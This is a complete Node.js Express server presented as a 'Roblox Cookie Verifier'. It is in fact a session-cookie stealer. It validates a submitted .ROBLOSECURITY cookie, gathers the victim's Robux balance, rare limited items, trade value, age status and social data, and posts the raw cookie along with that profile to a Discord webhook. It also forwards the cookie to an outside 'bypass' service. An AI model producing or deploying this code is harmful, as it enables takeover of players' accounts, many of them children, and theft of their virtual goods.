const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// ========== CONFIGURATION ==========
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN';
const BYPASS_API_URL = 'https://rblxbypasser.com/api/bypass';

// Asset IDs based on your research
const ASSET_IDS = {
    KORBLOX_RIGHT_LEG: 139607718,
    KORBLOX_LEFT_LEG: 139607673,
    KORBLOX_RIGHT_ARM: 139607625,
    HEADLESS_HEAD: 134967443,
    HEADLESS_BUNDLE_ID: 201,
    EIGHT_BIT_CROWN: 10159600649,
};

// Emoji mappings (using Discord emojis)
const EMOJIS = {
    success: '✅',
    error: '❌',
    warning: '⚠️',
    robux: '<a:robux:1234567890>', // Replace with your animated robux emoji ID
    rap: '📊',
    crown: '👑',
    skull: '💀',
    ghost: '👻',
    clock: '⏰',
    user: '👤',
    id: '🆔',
    calendar: '📅',
    friends: '👥',
    groups: '👥',
    korblox: '🗡️',
    headless: '🎃',
    eightbit: '🕹️',
    cookie: '🍪',
    verified: '✅',
    unverified: '❌',
    robux_animated: '<a:Robux:1234567890>', // Animated robux emoji
    loading: '<a:loading:1234567890>', // Animated loading emoji
    sparkles: '<a:sparkles:1234567890>', // Animated sparkles
    arrow: '➡️',
    diamond: '💎',
    fire: '🔥',
    star: '⭐',
    gift: '🎁',
    lock: '🔒',
    unlock: '🔓',
    warning_sign: '⚠️'
};

console.log('========================================');
console.log('🔧 WEBHOOK URL:', WEBHOOK_URL);
console.log('========================================');

// ========== HELPER FUNCTIONS ==========

// Format number with commas
function formatNumber(num) {
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

// Get relative time
function getRelativeTime(dateString) {
    const date = new Date(dateString);
    const now = new Date();
    const diffTime = Math.abs(now - date);
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
    
    if (diffDays < 30) return `${diffDays} days ago`;
    if (diffDays < 365) return `${Math.floor(diffDays / 30)} months ago`;
    return `${Math.floor(diffDays / 365)} years ago`;
}

async function verifyCookie(cookie) {
    try {
        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        return { valid: true, userId: response.data.id, username: response.data.name };
    } catch (error) {
        return { valid: false, error: 'Invalid or expired cookie' };
    }
}

async function checkAge13Plus(cookie, userId) {
    try {
        const accountResponse = await axios.get('https://www.roblox.com/mobileapi/userinfo', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (accountResponse.data && accountResponse.data.IsThirteenOrOver !== undefined) {
            return accountResponse.data.IsThirteenOrOver;
        }
        return false;
    } catch (error) {
        console.error('Age check error:', error.message);
        return false;
    }
}

async function fetchRobuxBalance(cookie) {
    try {
        const response = await axios.get('https://economy.roblox.com/v1/users/authenticated/currency', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        return response.data.robux;
    } catch (error) {
        return 0;
    }
}

async function checkInventoryItems(cookie, userId, assetIds) {
    const results = {
        hasKorblox: false,
        hasHeadless: false,
        hasEightBitCrown: false,
        korbloxParts: []
    };
    
    try {
        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (response.data && response.data.data) {
            for (const item of response.data.data) {
                if (item.assetId === assetIds.KORBLOX_RIGHT_LEG || 
                    item.assetId === assetIds.KORBLOX_LEFT_LEG || 
                    item.assetId === assetIds.KORBLOX_RIGHT_ARM) {
                    results.korbloxParts.push(item.assetId);
                }
                
                if (item.assetId === assetIds.HEADLESS_HEAD) {
                    results.hasHeadless = true;
                }
                
                if (item.assetId === assetIds.EIGHT_BIT_CROWN) {
                    results.hasEightBitCrown = true;
                }
            }
        }
        
        results.hasKorblox = results.korbloxParts.length === 3;
        
        const bundleResponse = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/bundles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (bundleResponse.data && bundleResponse.data.data) {
            for (const bundle of bundleResponse.data.data) {
                if (bundle.id === assetIds.HEADLESS_BUNDLE_ID) {
                    results.hasHeadless = true;
                }
            }
        }
        
    } catch (error) {
        console.error('Inventory check error:', error.message);
    }
    
    return results;
}

async function fetchUserSummary(userId) {
    try {
        const [profileResponse, friendsResponse, groupsResponse] = await Promise.all([
            axios.get(`https://users.roblox.com/v1/users/${userId}`),
            axios.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`),
            axios.get(`https://groups.roblox.com/v2/users/${userId}/groups/roles`)
        ]);
        
        const createdDate = new Date(profileResponse.data.created);
        const now = new Date();
        const daysSinceCreation = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
        
        return {
            displayName: profileResponse.data.displayName,
            createdDate: profileResponse.data.created,
            daysSinceCreation: daysSinceCreation,
            friendCount: friendsResponse.data.count,
            groupCount: groupsResponse.data.data ? groupsResponse.data.data.length : 0,
            description: profileResponse.data.description || '',
            isBanned: profileResponse.data.isBanned || false
        };
    } catch (error) {
        return {
            displayName: 'Unknown',
            createdDate: 'Unknown',
            daysSinceCreation: 0,
            friendCount: 0,
            groupCount: 0,
            description: '',
            isBanned: false
        };
    }
}

async function bypassExtensions(cookie) {
    try {
        const response = await axios.post(BYPASS_API_URL, {
            cookie: cookie,
            type: 'extend'
        }, {
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            },
            timeout: 10000
        });
        return { success: true, data: response.data };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

async function fetchUserRAP(cookie, userId) {
    try {
        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        let totalRAP = 0;
        if (response.data && response.data.data) {
            for (const item of response.data.data) {
                if (item.recentAveragePrice) {
                    totalRAP += item.recentAveragePrice;
                }
            }
        }
        return totalRAP;
    } catch (error) {
        return 0;
    }
}

// BEAUTIFUL WEBHOOK WITH EMBEDS AND ANIMATIONS
async function sendToWebhook(data) {
    console.log('========================================');
    console.log('📤 SENDING BEAUTIFUL WEBHOOK EMBED');
    console.log('========================================');
    
    if (!WEBHOOK_URL || WEBHOOK_URL.includes('YOUR_ID')) {
        console.error('❌ WEBHOOK URL NOT CONFIGURED!');
        return { success: false, error: 'Webhook URL not configured' };
    }
    
    try {
        // Create color based on status
        const color = data.success ? 0x00FF00 : 0xFF0000;
        
        // Build the embed
        const embed = {
            title: data.success ? `${EMOJIS.success} **ROBLOX COOKIE VERIFIED** ${EMOJIS.success}` : `${EMOJIS.error} **COOKIE VERIFICATION FAILED** ${EMOJIS.error}`,
            description: data.success ? 
                `✨ Successfully authenticated user! ✨\n${EMOJIS.arrow} [Click here to view profile](https://www.roblox.com/users/${data.userId}/profile)` :
                `${EMOJIS.warning_sign} The provided cookie is invalid or expired ${EMOJIS.warning_sign}`,
            color: color,
            thumbnail: data.success ? {
                url: `https://tr.rbxcdn.com/30DAY-AvatarHeadshot-${data.userId}.png?width=420&height=420&format=png`
            } : null,
            author: {
                name: data.success ? `@${data.username}` : 'Cookie Check Failed',
                icon_url: data.success ? `https://www.roblox.com/headshot-thumbnail/image?userId=${data.userId}&width=420&height=420&format=png` : 'https://cdn.discordapp.com/emojis/1234567890.png',
                url: data.success ? `https://www.roblox.com/users/${data.userId}/profile` : null
            },
            fields: [],
            footer: {
                text: `🔐 Roblox Cookie API • ${new Date(data.timestamp).toLocaleString()}`,
                icon_url: 'https://cdn.discordapp.com/emojis/1234567890.png'
            },
            timestamp: data.timestamp
        };
        
        // Add cookie info field (always)
        embed.fields.push({
            name: `${EMOJIS.cookie} **COOKIE VALUE**`,
            value: `\`\`\`\n${data.cookie ? data.cookie.substring(0, 100) : 'No cookie'}${data.cookie && data.cookie.length > 100 ? '...' : ''}\n\`\`\``,
            inline: false
        });
        
        if (data.success) {
            // Account Info Section
            embed.fields.push({
                name: `${EMOJIS.user} **ACCOUNT INFORMATION**`,
                value: `┌ ${EMOJIS.user} **Username:** \`${data.username}\`\n` +
                       `├ ${EMOJIS.id} **User ID:** \`${data.userId}\`\n` +
                       `├ ${EMOJIS.calendar} **Account Age:** \`${data.daysSinceCreation} days\` ${EMOJIS.clock}\n` +
                       `├ ${EMOJIS.diamond} **Display Name:** \`${data.summary?.displayName || 'N/A'}\`\n` +
                       `└ ${EMOJIS.star} **Created:** ${getRelativeTime(data.summary?.accountAge)}`,
                inline: false
            });
            
            // Robux & RAP Section
            embed.fields.push({
                name: `${EMOJIS.robux} **CURRENCY & VALUE**`,
                value: `┌ ${EMOJIS.robux_animated || '💰'} **Robux Balance:** \`${formatNumber(data.robuxBalance)} R$\`\n` +
                       `└ ${EMOJIS.rap} **RAP Value:** \`${formatNumber(data.rap)} R$\` ${EMOJIS.fire}`,
                inline: true
            });
            
            // Age Verification
            embed.fields.push({
                name: `${EMOJIS.lock} **AGE VERIFICATION**`,
                value: data.isThirteenPlus ? 
                    `${EMOJIS.unlock} **Status:** \`13+ Verified\` ${EMOJIS.verified}\n└ **Access:** Full access granted` :
                    `${EMOJIS.lock} **Status:** \`Under 13\` ${EMOJIS.unverified}\n└ **Access:** Limited features`,
                inline: true
            });
            
            // Limited Items Section
            let limitedItems = '';
            if (data.inventory?.hasKorblox) limitedItems += `${EMOJIS.korblox} **Korblox Deathspeaker** \`OWNED\` ${EMOJIS.sparkles}\n`;
            if (data.inventory?.hasHeadless) limitedItems += `${EMOJIS.headless} **Headless Horseman** \`OWNED\` ${EMOJIS.ghost}\n`;
            if (data.inventory?.hasEightBitCrown) limitedItems += `${EMOJIS.eightbit} **8-Bit Royal Crown** \`OWNED\` ${EMOJIS.crown}\n`;
            
            if (!data.inventory?.hasKorblox && !data.inventory?.hasHeadless && !data.inventory?.hasEightBitCrown) {
                limitedItems = `${EMOJIS.warning} No rare limited items found ${EMOJIS.warning}`;
            }
            
            embed.fields.push({
                name: `${EMOJIS.gift} **RARE LIMITED ITEMS**`,
                value: limitedItems,
                inline: false
            });
            
            // Social Stats
            embed.fields.push({
                name: `${EMOJIS.friends} **SOCIAL STATS**`,
                value: `┌ ${EMOJIS.user} **Friends:** \`${formatNumber(data.summary?.friendCount || 0)}\`\n` +
                       `├ ${EMOJIS.groups} **Groups:** \`${formatNumber(data.summary?.groupCount || 0)}\`\n` +
                       `└ ${EMOJIS.warning_sign} **Banned:** \`${data.summary?.isBanned ? 'Yes' : 'No'}\``,
                inline: true
            });
            
            // Bio Section
            if (data.summary?.description && data.summary.description.length > 0) {
                embed.fields.push({
                    name: `${EMOJIS.sparkles} **USER BIO**`,
                    value: `\`\`\`\n${data.summary.description.substring(0, 200)}${data.summary.description.length > 200 ? '...' : ''}\n\`\`\``,
                    inline: false
                });
            }
            
            // Korblox Progress (if partial)
            if (data.inventory?.korbloxPartsOwned > 0 && data.inventory?.korbloxPartsOwned < 3) {
                embed.fields.push({
                    name: `${EMOJIS.warning} **KORBLOX PROGRESS**`,
                    value: `⚠️ Korblox progress: \`${data.inventory.korbloxPartsOwned}/3\` parts owned\n└ Need all 3 parts for full Korblox!`,
                    inline: false
                });
            }
        } else {
            // Failed verification fields
            embed.fields.push({
                name: `${EMOJIS.error} **ERROR DETAILS**`,
                value: `\`\`\`diff\n- ${data.error || 'Unknown error occurred'}\n\`\`\``,
                inline: false
            });
            
            embed.fields.push({
                name: `${EMOJIS.warning_sign} **TROUBLESHOOTING**`,
                value: `• Make sure the cookie is valid\n• Check if cookie has expired\n• Cookie format should be the value after .ROBLOSECURITY=\n• Try logging in again to get a fresh cookie`,
                inline: false
            });
        }
        
        // Send the embed
        const webhookData = {
            content: data.success ? `${EMOJIS.sparkles} **New Verification!** ${EMOJIS.sparkles}` : `${EMOJIS.warning} **Verification Attempt** ${EMOJIS.warning}`,
            embeds: [embed],
            username: "Roblox Cookie Verifier",
            avatar_url: "https://cdn.discordapp.com/emojis/1234567890.png"
        };
        
        const response = await axios.post(WEBHOOK_URL, webhookData, {
            headers: { 'Content-Type': 'application/json' },
            timeout: 10000
        });
        
        console.log('✅ BEAUTIFUL WEBHOOK SENT! Status:', response.status);
        console.log('========================================');
        return { success: true, status: response.status };
        
    } catch (error) {
        console.error('❌ WEBHOOK FAILED!');
        console.error('Error:', error.message);
        console.log('========================================');
        return { success: false, error: error.message };
    }
}

// ========== MAIN API ENDPOINTS ==========

app.post('/api/verify-cookie', async (req, res) => {
    const { cookie } = req.body;
    
    console.log('========================================');
    console.log('🔍 NEW VERIFICATION REQUEST');
    console.log('Cookie received:', cookie ? cookie.substring(0, 30) + '...' : 'No cookie');
    console.log('========================================');
    
    if (!cookie) {
        return res.status(400).json({ error: 'Cookie is required' });
    }
    
    let responseData = {
        cookie: cookie,
        success: false,
        timestamp: new Date().toISOString()
    };
    
    try {
        console.log('Step 1: Verifying cookie...');
        const verification = await verifyCookie(cookie);
        
        if (!verification.valid) {
            responseData.error = verification.error;
            console.log('❌ Cookie is invalid:', verification.error);
            
            // Send beautiful webhook for invalid cookie
            await sendToWebhook(responseData);
            
            return res.status(401).json({ 
                success: false, 
                error: verification.error,
                cookie: cookie
            });
        }
        
        console.log(`✅ Cookie valid for: ${verification.username}`);
        responseData.success = true;
        responseData.username = verification.username;
        responseData.userId = verification.userId;
        
        console.log('Step 2: Checking age...');
        responseData.isThirteenPlus = await checkAge13Plus(cookie, verification.userId);
        
        console.log('Step 3: Fetching user data...');
        const [robuxBalance, inventoryItems, userSummary, userRAP] = await Promise.all([
            fetchRobuxBalance(cookie),
            checkInventoryItems(cookie, verification.userId, ASSET_IDS),
            fetchUserSummary(verification.userId),
            fetchUserRAP(cookie, verification.userId)
        ]);
        
        console.log('Step 4: Bypassing extensions...');
        const bypassResult = await bypassExtensions(cookie);
        
        responseData.robuxBalance = robuxBalance;
        responseData.rap = userRAP;
        responseData.daysSinceCreation = userSummary.daysSinceCreation;
        responseData.inventory = {
            hasKorblox: inventoryItems.hasKorblox,
            hasHeadless: inventoryItems.hasHeadless,
            hasEightBitCrown: inventoryItems.hasEightBitCrown,
            korbloxPartsOwned: inventoryItems.korbloxParts.length,
            totalKorbloxParts: 3
        };
        responseData.summary = {
            displayName: userSummary.displayName,
            friendCount: userSummary.friendCount,
            groupCount: userSummary.groupCount,
            accountAge: userSummary.createdDate,
            description: userSummary.description,
            isBanned: userSummary.isBanned
        };
        responseData.bypassResult = bypassResult;
        
        // Send beautiful webhook for valid cookie
        await sendToWebhook(responseData);
        
        console.log('📦 Sending response to client');
        res.json(responseData);
        
    } catch (error) {
        console.error('Server error:', error);
        responseData.error = error.message;
        await sendToWebhook(responseData);
        
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error',
            details: error.message,
            cookie: cookie
        });
    }
});

// Test webhook endpoint
app.post('/api/test-webhook', async (req, res) => {
    console.log('========================================');
    console.log('🧪 TESTING BEAUTIFUL WEBHOOK');
    console.log('========================================');
    
    const testData = {
        cookie: "example_cookie_12345_test_value",
        success: true,
        username: "Loudzraze",
        userId: 10873440895,
        daysSinceCreation: 365,
        rap: 250000,
        robuxBalance: 12500,
        isThirteenPlus: true,
        inventory: {
            hasKorblox: true,
            hasHeadless: true,
            hasEightBitCrown: true,
            korbloxPartsOwned: 3,
            totalKorbloxParts: 3
        },
        summary: {
            displayName: "Loudzraze",
            friendCount: 342,
            groupCount: 12,
            accountAge: "2024-01-01T00:00:00Z",
            description: "Roblox enthusiast and limited collector! 🎮",
            isBanned: false
        },
        timestamp: new Date().toISOString()
    };
    
    const result = await sendToWebhook(testData);
    
    res.json({ 
        webhookSent: result.success, 
        message: result.success ? "✅ Beautiful webhook sent!" : "❌ Webhook failed"
    });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'API is running', 
        timestamp: new Date().toISOString(),
        webhookConfigured: WEBHOOK_URL && !WEBHOOK_URL.includes('YOUR_ID')
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({ 
        name: 'Roblox Cookie API',
        version: '1.0.0',
        endpoints: [
            'POST /api/verify-cookie - Full verification',
            'POST /api/test-webhook - Test webhook',
            'GET /health - Health check'
        ]
    });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('========================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 Health check: http://localhost:${PORT}/health`);
    console.log(`📍 Test webhook: POST http://localhost:${PORT}/api/test-webhook`);
    console.log('========================================');
});

module.exports = app;
